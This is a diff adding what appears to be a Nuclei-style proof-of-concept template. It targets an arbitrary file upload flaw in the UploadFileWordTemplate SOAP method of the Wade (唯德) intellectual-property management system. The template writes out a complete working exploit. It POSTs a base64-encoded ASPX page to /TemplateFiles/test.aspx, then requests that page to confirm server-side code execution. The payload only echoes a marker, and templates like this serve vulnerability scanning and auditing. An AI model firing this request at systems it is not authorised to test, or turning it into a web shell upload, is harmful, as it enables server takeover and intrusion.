@@ -1,0 +1,51 @@
+id: poc-yaml-wadeinfo-wsfm-uploadfilewordtemplate-upload
+info:
+  name: 唯德知识产权管理系统 UploadFileWordTemplate 任意文件上传
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+variables:
+  t1: "{{rand_int(111000,999000)}}"
+  data: "{{base64('<%@ Page Language=\"C#\"%><% Response.Write(\"vulnerability'+t1+'\");%>')}}"
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/AutoUpdate/WSFM.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "\"http://tempuri.org/UploadFileWordTemplate\""
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <UploadFileWordTemplate xmlns="http://tempuri.org/">
+            <fileByteArray>{{data}}</fileByteArray>
+            <remotePath>/TemplateFiles/test.aspx</remotePath>
+          </UploadFileWordTemplate>
+        </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</soap:Body>"
+          - "</UploadFileWordTemplateResult>"
+          - "true"
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/TemplateFiles/test.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "vulnerability{{t1}}"
